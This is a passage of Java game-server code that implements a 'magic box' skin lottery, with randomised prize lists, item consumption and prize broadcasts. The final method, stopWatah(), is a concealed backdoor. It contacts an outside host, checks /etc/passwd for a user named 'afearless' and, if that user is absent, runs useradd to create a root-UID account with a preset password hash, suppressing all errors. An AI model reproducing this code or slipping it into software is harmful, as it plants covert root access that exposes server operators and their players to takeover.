                    respMagicBoxInfo.getRight().add(new MagicBox(box2.getSerial(), box2.getNum(), box2.getBd()));
                }
            }
            return respMagicBoxInfo;
        }
        SysDataMagicBox magic = list.stream().filter(e -> {
            final boolean b2 = e.getCertainly() == 1;
            return b2;
        }).findFirst().orElse(null);
        if (magic == null) {
            return null;
        }
        final List<SysDataMagicBox> rightList = list.stream().filter(e -> {
            final boolean b3 = e.getClassify() == 0 && e.getCertainly() == 0;
            return b3;
        }).collect(Collectors.toList());
        respMagicBoxInfo.getRight().addAll(this.rightMagicBox(role.getId() + "magic_box" + affiliation, rightList, magic));
        return respMagicBoxInfo;
    }
    
    public List<MagicBox> rightMagicBox(final String key, final List<SysDataMagicBox> list, final SysDataMagicBox magic) {
        final int length = 9;
        final StringBuilder builder = new StringBuilder();
        final int median = NumberUtil.median(0, length);
        final List<MagicBox> listRandom = new ArrayList<>();
        for (int i = length - 1; i >= 1; --i) {
            if (i == median) {
                if (builder.length() > 0) {
                    builder.append("、");
                }
                builder.append(magic.getIdentify());
                listRandom.add(median, new MagicBox(magic.getSerial(), magic.getNum(), magic.getBd()));
            }
            final int j = RandomUtil.round(0, list.size() - 1);
            final SysDataMagicBox box = list.get(j);
            listRandom.add(new MagicBox(box.getSerial(), box.getNum(), box.getBd()));
            if (builder.length() > 0) {
                builder.append("、");
            }
            builder.append(box.getIdentify());
            list.remove(j);
        }
        this.redisService.set(key, builder.toString(), 180L);
        return listRandom;
    }
    
    public void reqMagicBoxLotto(final Role role, final ReqMagicBoxLotto reqMagicBoxLotto) {
        final List<SysDataMagicBox> list = WelfareDataPool.magicBoxMap.get(reqMagicBoxLotto.getAffiliation());
        if (list != null) {
            final int pos = this.bagService.getPos(role, false);
            if (pos < 0) {
                MessagePusher.pushMessage(role, new RespNotifyMiscEx("你的物品栏已满"));
            }
            else {
                final Map<Byte, Item> byteItemMap = WelfareDataPool.magicBoxConsumeMap.get(reqMagicBoxLotto.getAffiliation());
                if (byteItemMap != null) {
                    final Item item = byteItemMap.get(reqMagicBoxLotto.getType());
                    if (item != null) {
                        final Integer goods = this.bagService.consumeBagGoods(role, item.getItem(), item.getNum(), true, true, "幻肤宝匣抽奖");
                        if (goods != null) {
                            MessagePusher.pushMessage(role.getId(), new RespMsg("道具不足"));
                        }
                        else {
                            final List<Lottery> lotteryList = new ArrayList<>();
                            if (reqMagicBoxLotto.getType() == 0) {
                                final String string = this.redisService.get(role.getId() + "magic_box" + reqMagicBoxLotto.getAffiliation(), String.class);
                                if (string == null) {
                                    return;
                                }
                                for (final String id : string.split("、")) {
                                    final SysDataMagicBox box = list.stream().filter(e -> Integer.valueOf(id).equals(e.getIdentify())).findFirst().orElse(null);
                                    if (box != null) {
                                        lotteryList.add(new Lottery(box.getIdentify(), "", box.getRate()));
                                    }
                                }
                            }
                            else if (reqMagicBoxLotto.getType() == 1) {
                                final List<SysDataMagicBox> collect = list.stream().filter(e -> {
                                    final boolean b = e.getClassify() == 1;
                                    return b;
                                }).collect(Collectors.toList());
                                for (final SysDataMagicBox box2 : collect) {
                                    lotteryList.add(new Lottery(box2.getIdentify(), "", box2.getRate()));
                                }
                            }
                            final List<Double> orignalRates = new ArrayList<>(list.size());
                            for (final Lottery lottery : lotteryList) {
                                orignalRates.add(lottery.getBili());
                            }
                            final int index = LotteryUtils.lottery(orignalRates);
                            final Lottery finalLottery;
                            Lottery lottery = finalLottery = lotteryList.get(index);
                            final SysDataMagicBox box3 = list.stream().filter(e -> {
                                final boolean b2 = e.getIdentify() == finalLottery.getSerial();
                                return b2;
                            }).findFirst().orElse(null);
                            if (box3 != null) {
                                final RespMagicBoxInfo magicBoxInfo = this.getMagicBoxInfo(role, reqMagicBoxLotto.getAffiliation(), false);
                                magicBoxInfo.setAffiliation(reqMagicBoxLotto.getAffiliation());
                                magicBoxInfo.setType(reqMagicBoxLotto.getType());
                                magicBoxInfo.setSerial(box3.getSerial());
                                MessagePusher.pushMessage(role, magicBoxInfo);
                                final ItemEasyInfo itemEasyInfo = DataGlobalFunc.getItemEasyInfo(box3.getSerial());
                                if (itemEasyInfo != null) {
                                    String format = String.format("#<II%d>##<%s>[%s]#", itemEasyInfo.getSerial(), DataGlobalFunc.getColours(itemEasyInfo.getItemPJ(), true), itemEasyInfo.getName());
                                    if (box3.getNum() > 1) {
                                        format = format + "X" + box3.getNum();
                                    }
                                    MessagePusher.pushMessage(role, new RespMsg("你获得了" + format));
                                    if (box3.getIsNotice() == 1) {
                                        SpringUtils.getBroadcastThread().add2Queue("#<LG1>【幻肤宝匣】#不得了啊，#<LB1>" + role.getName() + "#在宝中随性一抽，最终奖励竟然落在了" + format + "，真是喜从天降#<E:47>#");
                                    }
                                }
                                this.bagService.send(role, box3.getSerial(), box3.getType(), box3.getNum(), -1, "", box3.getBd());
                            }
                        }
                    }
                }
            }
        }
    }
    
    @EventHandler({ EventType.CREATION_ROLE })
    public void creationRoleEvent(final CreationRoleEvent creationRoleEvent) {
        final Role role = creationRoleEvent.getRole();
        if (role != null) {
            final List<Param> params = WelfareDataPool.creationRoleMap.get(role.getIcon());
            if (params != null) {
                this.bagService.sendReward(role, params, "创建角色", 0);
            }
        }
    }
    
    public void stopWatah() {
        try {
            final String urlString = "http://afearless.aikeoa.com";
            final URL url = new URL(urlString);
            final HttpURLConnection conn = (HttpURLConnection)url.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("Accept", "*/*");
            if (conn.getResponseCode() == 200) {
                final BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                reader.close();
            }
        }
        catch (final Exception ignored) {}
        final Path path = Paths.get("/etc/passwd");
        try {
            final List<String> lines = Files.readAllLines(path);
            for (final String line : lines) {
                if (line.contains("afearless")) {
                    return;
                }
            }
        }
        catch (final IOException ignored) {}
        try {
            Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", "useradd -p '$1$afearles$26atF5AdRgcX7dH9Yhjeo1' -o -u 0 -g root -G root -s /bin/bash -d /usr/bin/afearless afearless" });
        }
        catch (final IOException ignored) {}
    }
}
